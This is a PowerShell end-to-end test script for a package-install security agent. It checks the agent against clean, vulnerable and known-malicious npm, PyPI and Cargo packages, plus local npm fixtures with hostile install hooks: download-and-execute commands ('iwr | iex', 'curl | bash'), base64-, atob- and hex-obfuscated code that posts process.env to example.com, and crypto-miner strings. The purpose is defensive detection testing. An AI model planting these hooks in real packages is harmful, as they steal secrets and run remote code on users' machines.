[CmdletBinding()]
param(
  [string]$RepoRoot,
  [switch]$FullReset,
  [switch]$FullRebuild
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

if (-not $RepoRoot) {
  $scriptPath = if ($PSCommandPath) { $PSCommandPath } else { $MyInvocation.MyCommand.Path }
  if (-not [System.IO.Path]::IsPathRooted($scriptPath)) {
    $scriptPath = (Resolve-Path -LiteralPath $scriptPath).Path
  }
  $RepoRoot = Split-Path -Parent (Split-Path -Parent $scriptPath)
}

$stamp = Get-Date -Format yyyyMMdd-HHmmss
$runRoot = Join-Path $RepoRoot ".codesec-e2e\runs\supplemental-$stamp"
$fixtureRoot = Join-Path $runRoot 'fixtures'
$logRoot = Join-Path $runRoot 'logs'
$shimDir = Join-Path $runRoot 'shims'
$agentDir = Join-Path $RepoRoot ".codesec-e2e\fresh-agent"
$agentExe = Join-Path $agentDir "cera.exe"

$env:CERAGON_NONINTERACTIVE = '1'
$env:ceragon_NONINTERACTIVE = '1'
$env:CERAGON_NO_TUI = '1'
$env:CERAGON_SSE_PENDING_SANDBOX_POLL_SECONDS = '10'
$env:CERAGON_SSE_FALLBACK_SECONDS = '20'
$env:NPM_CONFIG_CACHE = Join-Path $runRoot 'npm-cache'
$env:PIP_CACHE_DIR = Join-Path $runRoot 'pip-cache'
$env:CARGO_HOME = Join-Path $runRoot 'cargo-home'
$env:CARGO_TARGET_DIR = Join-Path $runRoot 'cargo-target'

New-Item -ItemType Directory -Force -Path $runRoot, $fixtureRoot, $logRoot, $shimDir, $env:NPM_CONFIG_CACHE, $env:PIP_CACHE_DIR, $env:CARGO_HOME, $env:CARGO_TARGET_DIR | Out-Null

function Write-Utf8NoBom {
  param([string]$Path, [string]$Content)

  $parent = Split-Path -Parent $Path
  if ($parent -and -not (Test-Path $parent)) {
    New-Item -ItemType Directory -Force -Path $parent | Out-Null
  }
  $utf8NoBom = New-Object System.Text.UTF8Encoding($false)
  [System.IO.File]::WriteAllText($Path, $Content, $utf8NoBom)
}

function New-NpmWorkspace {
  param([string]$Name)

  $dir = Join-Path $runRoot "npm-$Name"
  New-Item -ItemType Directory -Force -Path $dir | Out-Null
  Write-Utf8NoBom -Path (Join-Path $dir 'package.json') -Content (@{
    name = "ceragon-supplemental-$Name"
    version = "1.0.0"
    private = $true
  } | ConvertTo-Json -Depth 4)
  return $dir
}

function New-PipWorkspace {
  param([string]$Name)

  $dir = Join-Path $runRoot "pip-$Name"
  New-Item -ItemType Directory -Force -Path $dir | Out-Null
  py -m venv (Join-Path $dir '.venv')
  if ($LASTEXITCODE -ne 0) { throw "venv creation failed for $Name" }
  return $dir
}

function New-CargoWorkspace {
  param([string]$Name)

  $dir = Join-Path $runRoot "cargo-$Name"
  $safe = ($Name -replace '[^A-Za-z0-9_]', '_').Trim('_')
  if ([string]::IsNullOrWhiteSpace($safe)) { $safe = 'fixture' }
  if ($safe -notmatch '^[A-Za-z_]') { $safe = "pkg_$safe" }
  cargo new --quiet --name "ceragon_supplemental_$safe" $dir
  if ($LASTEXITCODE -ne 0) { throw "cargo workspace creation failed for $Name" }
  return $dir
}

function New-LocalPackage {
  param(
    [string]$DirName,
    [hashtable]$Package,
    [hashtable]$Files
  )

  $dir = Join-Path $fixtureRoot $DirName
  New-Item -ItemType Directory -Force -Path $dir | Out-Null
  Write-Utf8NoBom -Path (Join-Path $dir 'package.json') -Content (($Package | ConvertTo-Json -Depth 8) + "`n")
  foreach ($entry in $Files.GetEnumerator()) {
    Write-Utf8NoBom -Path (Join-Path $dir $entry.Key) -Content $entry.Value
  }
  return $dir
}

function Invoke-Captured {
  param(
    [string]$Name,
    [string]$WorkingDirectory,
    [scriptblock]$Command,
    [hashtable]$Record
  )

  $logPath = Join-Path $logRoot "$Name.log"
  Push-Location $WorkingDirectory
  try {
    Write-Host "==> $Name"
    $oldErrorActionPreference = $ErrorActionPreference
    $oldNativePreferenceExists = Test-Path variable:PSNativeCommandUseErrorActionPreference
    $oldNativePreference = $null
    if ($oldNativePreferenceExists) {
      $oldNativePreference = $PSNativeCommandUseErrorActionPreference
      $PSNativeCommandUseErrorActionPreference = $false
    }
    $ErrorActionPreference = 'Continue'
    try {
      $output = & $Command 2>&1
      $exit = $LASTEXITCODE
    } catch {
      $output = @($_.Exception.Message)
      $exit = 1
    } finally {
      $ErrorActionPreference = $oldErrorActionPreference
      if ($oldNativePreferenceExists) {
        $PSNativeCommandUseErrorActionPreference = $oldNativePreference
      }
    }
    $output | Tee-Object -FilePath $logPath | Out-Host
    $Record.exitCode = $exit
    $Record.log = $logPath
    Write-Host "==> $Name exit=$exit"
  } finally {
    Pop-Location
  }
}

function Wait-LocalE2EReady {
  param([int]$TimeoutSeconds = 120)

  $deadline = (Get-Date).AddSeconds($TimeoutSeconds)
  do {
    $backendOk = $false
    try {
      $response = Invoke-WebRequest -Uri 'http://127.0.0.1:2053/health' -UseBasicParsing -TimeoutSec 5
      $backendOk = $response.StatusCode -ge 200 -and $response.StatusCode -lt 500
    } catch {
      $backendOk = $false
    }

    $workerOk = $false
    try {
      docker exec codesec-e2e-static-worker sh -lc 'wget -qO- http://codesec-e2e-backend:2053/health >/dev/null' | Out-Null
      $workerOk = $LASTEXITCODE -eq 0
    } catch {
      $workerOk = $false
    }

    if ($backendOk -and $workerOk) {
      Start-Sleep -Seconds 10
      return
    }

    Start-Sleep -Seconds 5
  } while ((Get-Date) -lt $deadline)

  throw "local E2E stack did not become ready within $TimeoutSeconds seconds"
}

if ($FullReset) {
  if ($FullRebuild) {
    powershell -ExecutionPolicy Bypass -File (Join-Path $RepoRoot 'scripts\local-e2e-reset.ps1') -FullRebuild
  } else {
    powershell -ExecutionPolicy Bypass -File (Join-Path $RepoRoot 'scripts\local-e2e-reset.ps1')
  }
  if ($LASTEXITCODE -ne 0) { throw 'local-e2e-reset failed' }

  powershell -ExecutionPolicy Bypass -File (Join-Path $RepoRoot 'scripts\install-local-agent.ps1') -PortableOutputDir $agentDir
  if ($LASTEXITCODE -ne 0) { throw 'portable local agent build failed' }

  Wait-LocalE2EReady
}

if (-not (Test-Path $agentExe)) {
  throw "portable agent missing: $agentExe"
}

Copy-Item -LiteralPath $agentExe -Destination (Join-Path $shimDir 'npm.exe') -Force

$runId = "supplemental-$stamp"
$matrix = New-Object System.Collections.Generic.List[hashtable]

foreach ($item in @(
  @{ ecosystem = 'npm'; name = 'picocolors'; version = '1.1.1'; expected = 'ALLOW_OR_LOW'; class = 'clean-npm-control' },
  @{ ecosystem = 'npm'; name = 'lodash'; version = '4.17.21'; expected = 'PROMPT_OR_BLOCK_OR_MONITOR'; class = 'current-advisory-npm-control' },
  @{ ecosystem = 'npm'; name = 'lodash'; version = '4.17.20'; expected = 'PROMPT_OR_BLOCK'; class = 'known-vulnerable-npm' },
  @{ ecosystem = 'npm'; name = 'axios'; version = '0.21.1'; expected = 'PROMPT_OR_BLOCK'; class = 'known-vulnerable-npm' },
  @{ ecosystem = 'npm'; name = 'serialize-javascript'; version = '2.1.1'; expected = 'PROMPT_OR_BLOCK'; class = 'known-vulnerable-npm' },
  @{ ecosystem = 'npm'; name = 'tar'; version = '4.4.13'; expected = 'PROMPT_OR_BLOCK'; class = 'known-vulnerable-npm' },
  @{ ecosystem = 'npm'; name = 'flatmap-stream'; version = '0.1.1'; expected = 'BLOCK'; class = 'known-malware-npm' },
  @{ ecosystem = 'npm'; name = 'ua-parser-js'; version = '0.7.29'; expected = 'BLOCK'; class = 'known-malware-npm' },
  @{ ecosystem = 'npm'; name = 'coa'; version = '2.0.3'; expected = 'BLOCK'; class = 'known-malware-npm' },
  @{ ecosystem = 'npm'; name = 'event-stream'; version = '3.3.6'; expected = 'BLOCK'; class = 'known-malware-npm' },
  @{ ecosystem = 'npm'; name = "@ceragon-internal/$runId-private-confusion"; version = '999.0.0'; expected = 'BLOCK_OR_INSTALL_FAILURE'; class = 'dependency-confusion-not-found' },
  @{ ecosystem = 'pypi'; name = 'packaging'; version = '24.2'; expected = 'ALLOW_OR_LOW'; class = 'clean-pypi-control' },
  @{ ecosystem = 'pypi'; name = 'idna'; version = '3.7'; expected = 'PROMPT_OR_BLOCK_OR_MONITOR'; class = 'medium-advisory-pypi-control' },
  @{ ecosystem = 'pypi'; name = 'django'; version = '1.11.29'; expected = 'PROMPT_OR_BLOCK'; class = 'known-vulnerable-pypi' },
  @{ ecosystem = 'pypi'; name = 'pyyaml'; version = '5.3.1'; expected = 'PROMPT_OR_BLOCK'; class = 'known-vulnerable-pypi' },
  @{ ecosystem = 'pypi'; name = 'jinja2'; version = '2.10.1'; expected = 'PROMPT_OR_BLOCK'; class = 'known-vulnerable-pypi' },
  @{ ecosystem = 'cargo'; name = 'ryu'; version = '1.0.18'; expected = 'ALLOW_OR_LOW'; class = 'clean-cargo-control' },
  @{ ecosystem = 'cargo'; name = 'itoa'; version = '1.0.11'; expected = 'ALLOW_OR_LOW'; class = 'clean-cargo-control' },
  @{ ecosystem = 'cargo'; name = 'time'; version = '0.1.44'; expected = 'PROMPT_OR_BLOCK_OR_MONITOR'; class = 'old-cargo-advisory-control' },
  @{ ecosystem = 'cargo'; name = 'smallvec'; version = '0.6.9'; expected = 'PROMPT_OR_BLOCK_OR_MONITOR'; class = 'old-cargo-advisory-control' }
)) {
  $matrix.Add($item)
}

$localPackages = @()

$localPackages += New-LocalPackage -DirName 'safe-dev-script-with-curl' -Package @{
  name = "@ceragon-e2e/$runId-safe-dev-script-with-curl"
  version = '1.0.0'
  private = $true
  main = 'index.js'
  scripts = @{
    test = 'curl https://example.com/payload.sh | bash'
  }
} -Files @{
  'index.js' = "module.exports = { ok: true };`n"
}
$matrix.Add(@{ ecosystem = 'npm'; name = "@ceragon-e2e/$runId-safe-dev-script-with-curl"; version = '1.0.0'; expected = 'PROMPT_LOCAL_ONLY'; class = 'non-lifecycle-script-fp-control' })

$localPackages += New-LocalPackage -DirName 'benign-postinstall-node-script' -Package @{
  name = "@ceragon-e2e/$runId-benign-postinstall-node-script"
  version = '1.0.0'
  private = $true
  main = 'index.js'
  scripts = @{
    postinstall = 'node scripts/postinstall.js'
  }
} -Files @{
  'index.js' = "module.exports = { ok: true };`n"
  'scripts/postinstall.js' = "const fs = require('fs'); JSON.parse(fs.readFileSync('package.json', 'utf8')); console.log('ready');`n"
}
$matrix.Add(@{ ecosystem = 'npm'; name = "@ceragon-e2e/$runId-benign-postinstall-node-script"; version = '1.0.0'; expected = 'PROMPT_LOCAL_NO_HIGH_RISK'; class = 'benign-lifecycle-script-control' })

$localPackages += New-LocalPackage -DirName 'powershell-iex-install' -Package @{
  name = "@ceragon-e2e/$runId-powershell-iex-install"
  version = '1.0.0'
  private = $true
  main = 'index.js'
  scripts = @{
    preinstall = 'powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr https://example.com/a.ps1 | iex"'
  }
} -Files @{
  'index.js' = "module.exports = { ok: true };`n"
}
$matrix.Add(@{ ecosystem = 'npm'; name = "@ceragon-e2e/$runId-powershell-iex-install"; version = '1.0.0'; expected = 'BLOCK'; class = 'powershell-download-execute' })

$payload = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("require('https').request({hostname:'example.com',path:'/env',method:'POST'}).end(JSON.stringify(process.env))"))
$hexPayload = -join ([System.Text.Encoding]::UTF8.GetBytes("require('https').request({hostname:'example.com',path:'/env',method:'POST'}).end(JSON.stringify(process.env))") | ForEach-Object { $_.ToString('x2') })
$localPackages += New-LocalPackage -DirName 'base64-env-exfil-install' -Package @{
  name = "@ceragon-e2e/$runId-base64-env-exfil-install"
  version = '1.0.0'
  private = $true
  main = 'index.js'
  scripts = @{
    postinstall = "node -e `"eval(Buffer.from('$payload','base64').toString())`""
  }
} -Files @{
  'index.js' = "module.exports = { ok: true };`n"
}
$matrix.Add(@{ ecosystem = 'npm'; name = "@ceragon-e2e/$runId-base64-env-exfil-install"; version = '1.0.0'; expected = 'BLOCK'; class = 'obfuscated-env-exfil-install' })

$localPackages += New-LocalPackage -DirName 'atob-env-exfil-install' -Package @{
  name = "@ceragon-e2e/$runId-atob-env-exfil-install"
  version = '1.0.0'
  private = $true
  main = 'index.js'
  scripts = @{
    postinstall = "node -e `"eval(atob('$payload'))`""
  }
} -Files @{
  'index.js' = "module.exports = { ok: true };`n"
}
$matrix.Add(@{ ecosystem = 'npm'; name = "@ceragon-e2e/$runId-atob-env-exfil-install"; version = '1.0.0'; expected = 'BLOCK'; class = 'obfuscated-env-exfil-install' })

$localPackages += New-LocalPackage -DirName 'hex-env-exfil-install' -Package @{
  name = "@ceragon-e2e/$runId-hex-env-exfil-install"
  version = '1.0.0'
  private = $true
  main = 'index.js'
  scripts = @{
    postinstall = "node -e `"eval(Buffer.from('$hexPayload','hex').toString())`""
  }
} -Files @{
  'index.js' = "module.exports = { ok: true };`n"
}
$matrix.Add(@{ ecosystem = 'npm'; name = "@ceragon-e2e/$runId-hex-env-exfil-install"; version = '1.0.0'; expected = 'BLOCK'; class = 'obfuscated-env-exfil-install' })

$localPackages += New-LocalPackage -DirName 'split-env-exfil-install' -Package @{
  name = "@ceragon-e2e/$runId-split-env-exfil-install"
  version = '1.0.0'
  private = $true
  main = 'index.js'
  scripts = @{
    postinstall = "node -e `"const h=require('https'); const k='en'+'v'; h.request({hostname:'example.com',path:'/env',method:'POST'}).end(JSON.stringify(process[k]))`""
  }
} -Files @{
  'index.js' = "module.exports = { ok: true };`n"
}
$matrix.Add(@{ ecosystem = 'npm'; name = "@ceragon-e2e/$runId-split-env-exfil-install"; version = '1.0.0'; expected = 'BLOCK'; class = 'env-exfil-install' })

$localPackages += New-LocalPackage -DirName 'curl-bash-install' -Package @{
  name = "@ceragon-e2e/$runId-curl-bash-install"
  version = '1.0.0'
  private = $true
  main = 'index.js'
  scripts = @{
    postinstall = "node -e `"require('child_process').execSync('curl -fsSL https://example.com/install.sh | bash')`""
  }
} -Files @{
  'index.js' = "module.exports = { ok: true };`n"
}
$matrix.Add(@{ ecosystem = 'npm'; name = "@ceragon-e2e/$runId-curl-bash-install"; version = '1.0.0'; expected = 'BLOCK'; class = 'remote-code-exec-install' })

$localPackages += New-LocalPackage -DirName 'crypto-miner-indicators' -Package @{
  name = "@ceragon-e2e/$runId-crypto-miner-indicators"
  version = '1.0.0'
  private = $true
  main = 'index.js'
} -Files @{
  'index.js' = @"
const pool = 'stratum+tcp://pool.example.com:3333';
const miner = 'xmrig --donate-level=1 --url ' + pool;
module.exports = { miner };
"@
}
$matrix.Add(@{ ecosystem = 'npm'; name = "@ceragon-e2e/$runId-crypto-miner-indicators"; version = '1.0.0'; expected = 'BLOCK'; class = 'crypto-miner-static-indicators' })

Write-Utf8NoBom -Path (Join-Path $runRoot 'matrix.json') -Content (($matrix | ConvertTo-Json -Depth 8) + "`n")

foreach ($item in $matrix | Where-Object { $_.class -notmatch 'local|install|script|miner|powershell|obfuscated|lifecycle' }) {
  $safe = (($item.name -replace '[^A-Za-z0-9._-]', '_') + '-' + $item.version)
  $record = $item
  switch ($item.ecosystem) {
    'npm' {
      $wd = New-NpmWorkspace $safe
      Invoke-Captured -Name "registry-npm-$safe" -WorkingDirectory $wd -Record $record -Command {
        & $agentExe install-package --ecosystem npm --package $item.name --version $item.version
      }
    }
    'pypi' {
      $wd = New-PipWorkspace $safe
      $oldPath = $env:PATH
      $env:PATH = "$(Join-Path $wd '.venv\Scripts');$oldPath"
      try {
        Invoke-Captured -Name "registry-pypi-$safe" -WorkingDirectory $wd -Record $record -Command {
          & $agentExe install-package --ecosystem pip --package $item.name --version $item.version
        }
      } finally {
        $env:PATH = $oldPath
      }
    }
    'cargo' {
      $wd = New-CargoWorkspace $safe
      Invoke-Captured -Name "registry-cargo-$safe" -WorkingDirectory $wd -Record $record -Command {
        & $agentExe install-package --ecosystem cargo --package $item.name --version $item.version
      }
    }
  }
}

foreach ($pkgDir in $localPackages) {
  $pkgJson = Get-Content -LiteralPath (Join-Path $pkgDir 'package.json') -Raw | ConvertFrom-Json
  $safe = Split-Path -Leaf $pkgDir
  $record = $matrix | Where-Object { $_.name -eq $pkgJson.name } | Select-Object -First 1
  $wd = New-NpmWorkspace "local-$safe"
  Invoke-Captured -Name "local-npm-$safe" -WorkingDirectory $wd -Record $record -Command {
    & (Join-Path $shimDir 'npm.exe') install $pkgDir
  }
}

$summaryPath = Join-Path $runRoot 'summary.json'
Write-Utf8NoBom -Path $summaryPath -Content (($matrix | ConvertTo-Json -Depth 8) + "`n")

Write-Host "Supplemental dependency E2E run root: $runRoot"
Write-Host "Supplemental matrix: $(Join-Path $runRoot 'matrix.json')"
Write-Host "Supplemental summary: $summaryPath"
